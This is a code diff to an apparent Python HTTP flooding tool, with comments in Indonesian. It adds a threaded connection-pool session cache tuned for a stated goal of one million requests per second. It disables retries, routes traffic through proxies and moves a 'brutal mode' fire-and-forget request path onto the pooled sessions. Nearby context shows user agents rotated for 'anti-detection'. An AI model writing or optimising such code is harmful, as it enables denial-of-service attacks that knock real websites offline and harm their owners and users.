@@ -2,7 +2,44 @@ import time
 import requests
 import json
 import random
-from config import REQUEST_TIMEOUT, DEFAULT_METHOD, DEFAULT_HEADERS, DEFAULT_DATA, BRUTAL_REQUEST_TIMEOUT
+import threading
+from config import REQUEST_TIMEOUT, DEFAULT_METHOD, DEFAULT_HEADERS, DEFAULT_DATA, BRUTAL_REQUEST_TIMEOUT, BRUTAL_KEEP_ALIVE, BRUTAL_FIRE_AND_FORGET
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+# Session pool untuk connection reuse (untuk 1M req/s)
+_session_pool = {}
+_session_lock = threading.Lock()
+
+def _get_session(proxy=None, brutal_mode=False):
+    """Get atau create session dengan connection pooling untuk performance"""
+    key = f"{proxy}_{brutal_mode}"
+    
+    if key not in _session_pool:
+        with _session_lock:
+            if key not in _session_pool:
+                session = requests.Session()
+                
+                # Setup connection pooling untuk 1M req/s
+                adapter = HTTPAdapter(
+                    pool_connections=100,  # Number of connection pools
+                    pool_maxsize=1000,  # Max connections per pool
+                    max_retries=Retry(total=0),  # No retries untuk speed
+                    pool_block=False  # Don't block jika pool penuh
+                )
+                session.mount('http://', adapter)
+                session.mount('https://', adapter)
+                
+                # Setup proxy jika ada
+                if proxy:
+                    session.proxies = {
+                        "http": proxy,
+                        "https": proxy
+                    }
+                
+                _session_pool[key] = session
+    
+    return _session_pool[key]
 
 # User agents untuk variasi (anti-detection)
 USER_AGENTS = [
@@ -69,24 +106,29 @@ def run_request(target, proxy, method=None, headers=None, data=None, brutal_mode
         
         # Brutal mode: fire and forget - send request tanpa menunggu response lengkap
         if brutal_mode and stream:
+            # Untuk brutal mode, gunakan session dengan connection reuse untuk 1M req/s
+            session = _get_session(proxy, brutal_mode)
+            
             # Untuk brutal mode, kirim request dan langsung close tanpa membaca response
             try:
+                # Gunakan session untuk connection reuse (1M req/s optimization)
                 if method_upper == "GET":
-                    r = requests.get(target, **request_kwargs)
+                    r = session.get(target, **request_kwargs)
                 elif method_upper == "POST":
-                    r = requests.post(target, **request_kwargs)
+                    r = session.post(target, **request_kwargs)
                 elif method_upper == "PUT":
-                    r = requests.put(target, **request_kwargs)
+                    r = session.put(target, **request_kwargs)
                 elif method_upper == "DELETE":
-                    r = requests.delete(target, **request_kwargs)
+                    r = session.delete(target, **request_kwargs)
                 elif method_upper == "PATCH":
-                    r = requests.patch(target, **request_kwargs)
+                    r = session.patch(target, **request_kwargs)
                 elif method_upper == "HEAD":
-                    r = requests.head(target, **request_kwargs)
+                    r = session.head(target, **request_kwargs)
                 elif method_upper == "OPTIONS":
-                    r = requests.options(target, **request_kwargs)
+                    r = session.options(target, **request_kwargs)
                 else:
-                    r = requests.get(target, **request_kwargs)
+                    r = session.get(target, **request_kwargs)
+                
                 
                 # Untuk brutal mode, kita tetap perlu track bytes untuk statistik
                 # Tapi jangan menunggu response lengkap - baca header dan sebagian content
